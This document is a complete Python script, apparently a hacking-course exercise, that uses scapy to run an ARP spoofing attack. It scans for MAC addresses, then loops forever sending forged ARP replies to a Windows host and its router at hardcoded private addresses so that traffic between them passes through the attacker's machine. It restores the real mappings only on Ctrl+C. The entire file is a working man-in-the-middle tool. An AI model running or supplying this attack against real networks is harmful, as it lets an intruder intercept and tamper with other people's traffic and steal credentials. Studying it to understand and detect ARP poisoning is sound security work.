import scapy.all as scapy
import time

def scan(ip):

    # Create an ARP packet with destination IP and MAC for victim machine
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') # Set mac as ff:...:ff to send to all pc in network
    arp_request_broadcast = broadcast/arp_request  # Combine and make one pkt

    # Send arp packets and receive response with ip and mac from all devices
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    clients_list = []

    for el in answered:
        dic = {"ip": el[1].psrc, "mac": el[1].hwsrc}
        clients_list.append(dic)

    return clients_list[0]['mac']


def sendArp(targetIP, spoofIP, restore=False):

    try: 
        target_mac = scan(targetIP)
        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=target_mac, psrc=spoofIP) # Make a ARP packet

        if restore:
            restore_mac = scan(spoofIP)
            packet = scapy.ARP(op=2, pdst=targetIP, hwdst=target_mac, psrc=spoofIP, hwsrc=restore_mac) # Make a ARP packet

        # Send ARP packet to device
        scapy.send(packet, verbose=False)
    except ValueError as err:
        print(f'The error is :\n\t{err}')

windowsIP = '192.168.157.174'
RouterIP = '192.168.157.2'

packetCount = 0

try:
    while True:
        sendArp(targetIP=windowsIP, spoofIP=RouterIP)
        sendArp(targetIP=RouterIP, spoofIP=windowsIP)
        packetCount+=2
        print(f'\r[+] Packets sent: {int(packetCount)}', end="")
        time.sleep(1) # Wait for 1 second
        
except KeyboardInterrupt: # Fire when ctrl+C is pressed
    sendArp(targetIP=windowsIP, spoofIP=RouterIP, restore=True)
    sendArp(targetIP=RouterIP, spoofIP=windowsIP, restore=True)
    print('\n Detected CTRL+C....Quitting')


